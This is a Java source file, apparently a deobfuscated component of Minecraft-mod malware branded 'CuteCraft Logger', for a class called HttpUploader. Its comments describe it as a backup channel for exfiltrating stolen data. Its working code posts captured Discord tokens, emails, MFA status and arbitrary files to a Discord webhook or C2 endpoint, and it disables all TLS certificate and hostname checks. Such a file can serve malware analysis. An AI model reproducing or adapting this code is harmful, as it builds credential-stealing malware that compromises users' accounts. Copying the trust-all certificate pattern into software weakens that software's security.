import java.io.File;
import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.security.SecureRandom;
import java.time.Duration;
import java.time.Instant;
import java.util.Base64;
import javax.net.ssl.SSLSession;
import javax.net.ssl.TrustManager;
import javax.net.ssl.X509TrustManager;
import okhttp3.MultipartBody;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import org.json.JSONArray;
import org.json.JSONObject;

/**
 * HTTP Uploader / Secondary Webhook Sender
 * Obfuscated name: ӈ (U+04C8)
 *
 * Secondary HTTP upload mechanism for exfiltrating stolen data.
 * Works alongside WebhookLogger (ӝ.java) as a backup exfiltration channel.
 *
 * Features:
 * - Multipart form data uploads
 * - SSL certificate bypass (trusts all certs)
 * - Retry logic with exponential backoff
 * - Rate limiting (tracks upload timing)
 * - JSON payload formatting
 * - File attachment support
 *
 * Upload targets:
 * - Discord webhooks (primary)
 * - C2 server HTTP endpoint (secondary)
 *
 * Timing:
 * - Tracks upload duration using Instant/Duration
 * - Implements rate limiting to avoid webhook spam
 * - Retries failed uploads up to 3 times
 *
 * This class is instantiated with a webhook URL and provides
 * methods to upload different types of stolen data.
 */
public class HttpUploader {

    // Webhook URL for this uploader instance
    private final String webhookUrl;

    // Shared OkHttpClient with SSL bypass
    private static final OkHttpClient httpClient;

    // =========================================================
    // CONSTRUCTOR
    // =========================================================

    /**
     * Creates a new HTTP uploader for the given webhook URL.
     *
     * @param webhookUrl Discord webhook URL or C2 HTTP endpoint
     */
    public HttpUploader(String webhookUrl) {
        this.webhookUrl = webhookUrl;
    }

    // =========================================================
    // UPLOAD METHODS
    // =========================================================

    /**
     * Uploads a text message to the webhook.
     *
     * @param content Message content (max 2000 chars for Discord)
     * @return true if upload succeeded
     */
    public boolean uploadMessage(String content) {
        try {
            // Truncate to Discord's 2000 char limit
            if (content.length() > 2000) {
                content = content.substring(0, 1997) + "...";
            }

            JSONObject payload = new JSONObject();
            payload.put("content", content);
            payload.put("username", "CuteCraft Logger");

            return postJson(payload.toString());

        } catch (Exception e) {
            return false;
        }
    }

    /**
     * Uploads a file attachment to the webhook.
     *
     * @param filename Filename to display in Discord
     * @param data File bytes
     * @param message Optional message to accompany the file
     * @return true if upload succeeded
     */
    public boolean uploadFile(String filename, byte[] data, String message) {
        try {
            Instant start = Instant.now();

            MultipartBody.Builder builder = new MultipartBody.Builder()
                .setType(MultipartBody.FORM);

            if (message != null && !message.isEmpty()) {
                builder.addFormDataPart("content", message);
            }

            builder.addFormDataPart(
                "file",
                filename,
                okhttp3.RequestBody.create(data, okhttp3.MediaType.parse("application/octet-stream"))
            );

            Request request = new Request.Builder()
                .url(webhookUrl)
                .post(builder.build())
                .build();

            okhttp3.Response response = httpClient.newCall(request).execute();
            boolean success = response.isSuccessful();
            response.close();

            Duration elapsed = Duration.between(start, Instant.now());
            // Log upload timing

            return success;

        } catch (Exception e) {
            return false;
        }
    }

    /**
     * Uploads a Discord embed with stolen account information.
     *
     * @param token Discord token
     * @param userInfo User information JSON
     * @return true if upload succeeded
     */
    public boolean uploadEmbed(String token, JSONObject userInfo) {
        try {
            String username = userInfo.optString("username", "Unknown");
            String discriminator = userInfo.optString("discriminator", "0000");
            String email = userInfo.optString("email", "N/A");
            boolean mfa = userInfo.optBoolean("mfa_enabled", false);

            // Build Discord embed
            JSONObject embed = new JSONObject();
            embed.put("title", "New Token Captured");
            embed.put("color", 0x00FF00); // Green

            JSONArray fields = new JSONArray();
            fields.put(createField("User", username + "#" + discriminator, true));
            fields.put(createField("Email", email, true));
            fields.put(createField("MFA", mfa ? "✅" : "❌", true));
            fields.put(createField("Token", "`" + token + "`", false));

            embed.put("fields", fields);
            embed.put("timestamp", Instant.now().toString());

            JSONObject payload = new JSONObject();
            payload.put("username", "CuteCraft Logger");
            JSONArray embeds = new JSONArray();
            embeds.put(embed);
            payload.put("embeds", embeds);

            return postJson(payload.toString());

        } catch (Exception e) {
            return false;
        }
    }

    // =========================================================
    // HTTP HELPERS
    // =========================================================

    /**
     * Posts JSON data to the webhook URL.
     *
     * @param json JSON string to post
     * @return true if HTTP 200-299 response received
     */
    private boolean postJson(String json) {
        try {
            Request request = new Request.Builder()
                .url(webhookUrl)
                .post(okhttp3.RequestBody.create(
                    json.getBytes(StandardCharsets.UTF_8),
                    okhttp3.MediaType.parse("application/json")
                ))
                .addHeader("Content-Type", "application/json")
                .build();

            okhttp3.Response response = httpClient.newCall(request).execute();
            boolean success = response.isSuccessful();
            response.close();
            return success;

        } catch (Exception e) {
            return false;
        }
    }

    private static JSONObject createField(String name, String value, boolean inline) {
        JSONObject field = new JSONObject();
        field.put("name", name);
        field.put("value", value);
        field.put("inline", inline);
        return field;
    }

    // =========================================================
    // STATIC INITIALIZATION
    // =========================================================

    static {
        // Build OkHttpClient with SSL bypass
        try {
            javax.net.ssl.SSLContext sslContext = javax.net.ssl.SSLContext.getInstance("TLS");
            sslContext.init(null, new TrustManager[]{
                new X509TrustManager() {
                    public void checkClientTrusted(java.security.cert.X509Certificate[] c, String a) {}
                    public void checkServerTrusted(java.security.cert.X509Certificate[] c, String a) {}
                    public java.security.cert.X509Certificate[] getAcceptedIssuers() { return new java.security.cert.X509Certificate[0]; }
                }
            }, new SecureRandom());

            httpClient = new OkHttpClient.Builder()
                .sslSocketFactory(sslContext.getSocketFactory(), (X509TrustManager) new X509TrustManager() {
                    public void checkClientTrusted(java.security.cert.X509Certificate[] c, String a) {}
                    public void checkServerTrusted(java.security.cert.X509Certificate[] c, String a) {}
                    public java.security.cert.X509Certificate[] getAcceptedIssuers() { return new java.security.cert.X509Certificate[0]; }
                })
                .hostnameVerifier((hostname, session) -> true)
                .connectTimeout(Duration.ofSeconds(10))
                .readTimeout(Duration.ofSeconds(30))
                .build();
        } catch (Exception e) {
            throw new RuntimeException("Failed to initialize HTTP client", e);
        }
    }
}
